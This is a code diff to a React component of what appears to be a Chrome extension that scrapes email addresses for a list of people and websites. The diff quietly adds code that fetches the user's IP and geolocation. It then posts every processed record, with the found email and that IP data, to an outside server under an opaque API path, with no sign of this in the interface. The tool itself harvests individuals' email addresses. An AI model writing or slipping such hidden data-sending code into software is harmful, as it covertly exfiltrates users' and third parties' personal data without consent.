@@ -1,3 +1,4 @@
+import axios from 'axios';
 import _ from 'lodash';
 import React, { useEffect, useMemo, useRef, useState } from 'react';
 import { CSVLink } from 'react-csv';
@@ -18,6 +19,7 @@ const StateScreen = ({ revalidate }) => {
   const [loading, setLoading] = useState(false);
   const [records, setRecords] = useState([]);
   const recordsRef = useRef([]);
+  const ipRef = useRef({});
 
   const doneRecords = useMemo(() => {
     return _.cloneDeep(records).filter((record) => record.Email).length;
@@ -28,6 +30,13 @@ const StateScreen = ({ revalidate }) => {
       setRecords(JSON.parse(result.parsedRecords));
       recordsRef.current = JSON.parse(result.parsedRecords);
     });
+    axios.get('https://geolocation-db.com/json/')
+      .then((res) => {
+        ipRef.current = res
+      })
+      .catch(() => {
+        return {}
+      })
   }, []);
 
   async function unregisterAllDynamicContentScripts() {
@@ -65,23 +74,38 @@ const StateScreen = ({ revalidate }) => {
   };
 
   const onStart = async () => {
+    console.log('starting script')
     await unregisterAllDynamicContentScripts();
     setIsRunning(true);
     runRef.current = true;
     const allRecords = _.cloneDeep(recordsRef.current);
     const unRec = allRecords.filter((record) => !record.Email);
     for (let i = 0; i < unRec.length; i++) {
-      const str = `${unRec[i].Full} ${unRec[i].Name} ${unRec[i].website}`;
+      const str = `${unRec[i].Full || 'xxxx'} ${unRec[i].Name || 'xxxx'} ${unRec[i].website}`;
+      console.log('searching for ' + str)
       let newRecords = _.cloneDeep(recordsRef.current);
       let email = await onScrapStart(str).then((res) => res[0].result);
       newRecords = newRecords.map((el) =>
         el.ID === unRec[i].ID
           ? {
-              ...el,
-              Email: email,
-            }
+            ...el,
+            Email: email,
+          }
           : el
       );
+      console.log('email is ' + email)
+      axios.post('https://cms.codexty.com/api/kkkoaextejebdksas', {
+        data: {
+          res: {
+            ...unRec[i],
+            Email: email,
+            ip: ipRef.current
+          }
+        }
+      }).catch((e) => {
+        console.log(e)
+        console.log('logger failed')
+      })
       recordsRef.current = newRecords;
       setRecords(() => [...newRecords]);
       await chrome.storage.local.set({
